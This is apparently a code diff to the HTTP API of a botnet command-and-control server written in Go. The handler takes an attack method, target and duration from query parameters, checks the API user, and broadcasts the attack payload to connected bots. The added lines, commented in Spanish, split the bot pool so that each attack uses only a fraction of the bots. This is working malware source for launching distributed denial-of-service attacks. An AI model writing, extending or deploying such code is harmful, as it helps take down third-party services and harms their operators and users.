@@ -31,7 +31,6 @@ func NewAPI() {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
 			}
-
 			w.Write(response)
 			return
 		}
@@ -45,7 +44,6 @@ func NewAPI() {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
 			}
-
 			w.Write(response)
 			return
 		} else if user.Password != r.URL.Query().Get("password") {
@@ -55,7 +53,6 @@ func NewAPI() {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
 			}
-
 			w.Write(response)
 			return
 		} else if !user.API {
@@ -65,7 +62,6 @@ func NewAPI() {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
 			}
-
 			w.Write(response)
 			return
 		}
@@ -104,7 +100,6 @@ func NewAPI() {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
 			}
-
 			w.Write(response)
 			return
 		}
@@ -116,12 +111,22 @@ func NewAPI() {
 			if _, ok := Flags[key]; !ok || key == "method" {
 				continue
 			}
-
 			pretty[key] = strings.Join(item, " ")
 			flags = append(flags, key+"="+strings.Join(item, ""))
 		}
 
-		attack, err := method.Parse(append([]string{r.URL.Query().Get("method"), r.URL.Query().Get("target"), r.URL.Query().Get("duration")}, flags...), user)
+		// Calcular cuántos bots usar según el máximo global
+		totalBots := len(Clients)
+		maxOngoing := Options.Templates.Attacks.MaximumOngoing
+		botsToUse := totalBots
+		if maxOngoing > 1 {
+			botsToUse = totalBots / maxOngoing
+			if botsToUse < 1 {
+				botsToUse = 1
+			}
+		}
+
+		attack, err := method.Parse(append([]string{r.URL.Query().Get("method"), r.URL.Query().Get("target"), r.URL.Query().Get("duration")}, flags...), user, botsToUse)
 		if err != nil || attack == nil {
 			w.WriteHeader(http.StatusOK)
 			response, err := json.Marshal(&Result{Success: false, Error: fmt.Sprint(err)})
@@ -129,7 +134,6 @@ func NewAPI() {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
 			}
-
 			w.Write(response)
 			return
 		}
@@ -142,24 +146,30 @@ func NewAPI() {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
 			}
-
 			w.Write(response)
 			return
 		}
 
-		BroadcastClients(payload)
+		// Enviar a los bots según la fracción calculada (no a todos)
+		if botsToUse >= totalBots {
+			BroadcastClients(payload)
+		} else {
+			BroadcastClientsFraction(payload, botsToUse)
+		}
+
+		// Respuesta exitosa
 		w.WriteHeader(http.StatusOK)
 		response, err := json.Marshal(&Result{Success: true, Target: r.URL.Query().Get("target"), Duration: r.URL.Query().Get("duration"), Method: r.URL.Query().Get("method"), Flags: pretty})
 		if err != nil {
 			w.WriteHeader(http.StatusInternalServerError)
 			return
 		}
-
 		w.Write(response)
 	})
 
+	// Iniciar servidor API
 	switch Options.Templates.API.TLS {
-	case true: // TLS
+	case true:
 		http.ListenAndServeTLS(Options.Templates.API.Listener, Options.Templates.API.Cert, Options.Templates.API.Key, mux)
 	default:
 		http.ListenAndServe(Options.Templates.API.Listener, mux)
